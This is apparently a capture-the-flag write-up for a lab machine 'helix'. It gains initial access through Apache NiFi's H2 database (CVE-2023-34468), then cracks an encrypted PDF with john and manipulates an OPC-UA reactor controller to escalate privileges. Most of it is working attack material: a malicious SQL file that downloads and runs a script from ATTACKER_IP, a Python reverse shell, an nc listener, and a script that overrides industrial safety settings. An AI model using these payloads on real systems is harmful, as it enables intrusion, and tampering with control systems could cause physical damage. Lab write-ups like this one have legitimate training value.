Phase 1

Initial Access — NiFi H2 Database RCE (CVE-2023-34468)

What is Apache NiFi? NiFi is a data flow automation tool — it moves data between systems using visual "processors" connected in a flow. It can connect to databases, run scripts, and execute system commands. When exposed without authentication, its full power is available to attackers.

Setting Up the Attack

NiFi's DBCPConnectionPool can connect to an H2 database. H2 supports RUNSCRIPT which loads and executes SQL from a URL. We abuse this to execute arbitrary Java code via CREATE ALIAS.

Create the malicious SQL file on the attacker:

# poc.sql — creates a Java function that executes system commands
DROP ALIAS IF EXISTS SHELLEXEC;
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    Runtime.getRuntime().exec(new String[]{"bash","-c",cmd});
    return "ok"; }
$$;
CALL SHELLEXEC('curl http://ATTACKER_IP:8888/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh')
# rev.sh — Python reverse shell (more reliable than /dev/tcp)
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["bash","-i"])'
# Terminal 1: HTTP server (poc.sql and rev.sh in same directory)
$ python3 -m http.server 8888

# Terminal 2: listener
$ nc -lvnp 9002

Phase 3

Privilege Escalation — OPC-UA Industrial Control Manipulation

Understanding the Environment

operator@helix:~$ sudo -l
(root) NOPASSWD: /usr/local/sbin/helix-maint-console

The maintenance console only works when a maintenance window is active (file /opt/helix/state/maintenance_window exists with a future timestamp). The window is created by helix-safety (root process) when reactor temperature reaches 295-304°C.

Operator's home has an encrypted PDF with operational parameters. Crack it:

$ pdf2john "Operator Control & Safety Guide.pdf" > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
operator1

$ qpdf --password=operator1 --decrypt guide.pdf unlocked.pdf

OPC-UA Manipulation

SSH tunnel internal ports, then use Python opcua library to manipulate the reactor:

$ ssh -i operator_key -L 4840:127.0.0.1:4840 -L 8081:127.0.0.1:8081 operator@helix.htb
# OPC-UA attack script — slowly ramp temperature to trigger maintenance window
python3 -c "
from opcua import Client, ua
import time

c = Client('opc.tcp://127.0.0.1:4840/helix/')
c.connect()

print('Step 1: Switch to MAINTENANCE + enable TestOverride')
c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
time.sleep(2)

print('Step 2: Slowly ramp CalibrationOffset')
offset = 0.0
while True:
    offset += 0.5
    if offset > 12.0:
        offset = 12.0
    c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
    c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
    c.get_node('ns=2;i=6').set_value(ua.DataValue(ua.Variant(offset, ua.VariantType.Double)))
    temp = c.get_node('ns=2;i=4').get_value()
    trip = c.get_node('ns=2;i=10').get_value()
    print(f'Offset={offset:.1f}, Temp={temp:.1f}, Trip={trip}')
    if offset >= 12.0:
        print('Holding at target offset...')
        while True:
            c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
            c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
            c.get_node('ns=2;i=6').set_value(ua.DataValue(ua.Variant(12.0, ua.VariantType.Double)))
            time.sleep(0.3)
    time.sleep(1)
"

Appendix

Key Takeaways

NiFi without authentication = direct RCE.

NiFi's database connectivity features allow loading remote SQL scripts via H2's RUNSCRIPT, which can execute arbitrary Java code.

Backup files in application directories are gold.

The SSH key was in support-bundles/ — a directory that developers rarely clean up.

ICS/OT attacks require understanding business logic.

Brute-forcing the offset causes a trip (safety shutdown). The PDF documentation revealed the exact thresholds and timing needed for a controlled approach.

Read the documentation.

The encrypted PDF contained the exact parameters needed. Cracking it with john was trivial — the real skill was knowing to look for it.
